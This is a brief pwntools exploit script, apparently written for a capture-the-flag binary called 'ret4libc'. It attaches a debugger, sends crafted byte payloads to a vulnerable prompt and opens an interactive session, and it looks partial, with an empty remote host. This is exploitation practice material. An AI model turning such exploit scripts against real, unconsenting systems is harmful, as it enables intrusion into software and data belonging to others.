#!/usr/bin/python3

from pwn import *

exe = ELF('ret4libc', checksec=False)
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* vuln +203

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
payload = b"dev" + p8(0x20) + p8(0x40) + p8(0x40)
sla(b"bone:", payload)
p.recvuntil(b"results:")
payload = b"\x7f"
sla(b"bone:", payload)
p.interactive()
